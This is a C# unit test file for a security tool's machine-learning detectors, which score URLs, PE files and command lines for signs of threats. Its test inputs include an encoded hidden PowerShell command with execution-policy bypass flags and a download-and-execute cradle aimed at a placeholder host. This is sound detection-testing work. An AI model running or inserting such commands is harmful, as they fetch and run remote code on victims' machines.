using System;
using System.IO;
using Xunit;
using Sentinel.Core.Ml;

namespace Sentinel.Tests
{
    public class MlFeatureTests
    {
        [Fact]
        public void UrlFeatureExtractor_ExtractsBasicStats()
        {
            var v = UrlFeatureExtractor.Extract("http://evil-download.tk/payload.exe?id=123");
            Assert.True(v.UrlLength > 10);
            Assert.True(v.HasHttp > 0);
            Assert.True(v.DotCount >= 2);
            Assert.True(v.HasSuspiciousTld > 0 || v.TldLength > 0);
        }

        [Fact]
        public void UrlFeatureExtractor_Empty_ReturnsZeros()
        {
            var v = UrlFeatureExtractor.Extract("");
            Assert.Equal(0, v.UrlLength);
        }

        [Fact]
        public void PeFeatureExtractor_NonPe_ReturnsNull()
        {
            var path = Path.Combine(Path.GetTempPath(), "sentinel_ml_test_" + Guid.NewGuid().ToString("N") + ".txt");
            try
            {
                File.WriteAllText(path, "not a pe file");
                Assert.Null(PeFeatureExtractor.TryExtract(path));
            }
            finally
            {
                try { File.Delete(path); } catch { }
            }
        }

        [Fact]
        public void PeFeatureExtractor_RealPe_ExtractsSections()
        {
            // Use the currently loaded Core assembly as a PE
            var pePath = typeof(PeFeatureExtractor).Assembly.Location;
            if (string.IsNullOrEmpty(pePath) || !File.Exists(pePath))
            {
                // Single-file / empty location - skip
                return;
            }

            var v = PeFeatureExtractor.TryExtract(pePath);
            Assert.NotNull(v);
            Assert.True(v!.SectionsNb >= 1);
            Assert.True(v.SizeOfImage > 0);
        }

        [Fact]
        public void MlThreatScorer_WithoutModels_ReturnsNullScores()
        {
            using var scorer = new MlThreatScorer();
            // Without models present, scores are null (graceful degrade)
            // May load models if they exist in output dir - either way must not throw
            var pe = scorer.ScorePeFile(typeof(PeFeatureExtractor).Assembly.Location);
            var url = scorer.ScoreUrlOrHost("http://example.com/test");
            // Just ensure API is callable; null or value both OK
            Assert.True(pe == null || (pe >= 0 && pe <= 1));
            Assert.True(url == null || (url >= 0 && url <= 1));
        }

        // 
        // Command-line obfuscation scorer (v2.7.8)
        // 

        [Fact]
        public void CommandLineFeatureExtractor_Empty_ReturnsZeros()
        {
            var v = CommandLineFeatureExtractor.Extract("");
            Assert.Equal(0, v.Length);
            Assert.Equal(0, v.TokenCount);
        }

        [Fact]
        public void CommandLineFeatureExtractor_DetectsEncodedPowerShell()
        {
            var v = CommandLineFeatureExtractor.Extract(
                "powershell.exe -nop -w hidden -ep bypass -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0AC4A");
            Assert.True(v.HasEncodedCommandFlag > 0);
            Assert.True(v.HasHiddenWindowFlag > 0);
            Assert.True(v.HasExecBypassFlag > 0);
            Assert.True(v.MaxAlnumRunLength >= 30);
        }

        [Fact]
        public void CommandLineFeatureExtractor_DetectsDownloadCradle()
        {
            var v = CommandLineFeatureExtractor.Extract(
                "powershell iex (New-Object Net.WebClient).DownloadString('http://x/y')");
            Assert.True(v.HasDownloadToken > 0);
            Assert.True(v.HasIexToken > 0);
        }

        [Fact]
        public void HeuristicScore_ObfuscatedHigherThanBenign()
        {
            var benign = CommandLineFeatureExtractor.Extract(@"C:\Program Files\App\app.exe --config settings.json");
            var obfuscated = CommandLineFeatureExtractor.Extract(
                "powershell.exe -nop -w hidden -ep bypass -enc " + new string('A', 220));

            double benignScore = MlThreatScorer.HeuristicCommandLineScore(benign);
            double obfScore = MlThreatScorer.HeuristicCommandLineScore(obfuscated);

            Assert.True(benignScore < 0.3, $"benign scored {benignScore}");
            Assert.True(obfScore > benignScore);
            Assert.InRange(obfScore, 0.0, 1.0);
        }

        [Fact]
        public void ScoreCommandLine_NeverThrows_AndReturnsBounded()
        {
            using var scorer = new MlThreatScorer();
            Assert.Null(scorer.ScoreCommandLine(""));

            var s = scorer.ScoreCommandLine("powershell -enc " + new string('Q', 300));
            Assert.NotNull(s); // heuristic guarantees a value for a non-empty command line
            Assert.InRange(s!.Value, 0.0, 1.0);

            var r = scorer.CommandLineRiskScore100("cmd.exe /c whoami");
            Assert.True(r == null || (r >= 0 && r <= 100));
        }
    }
}
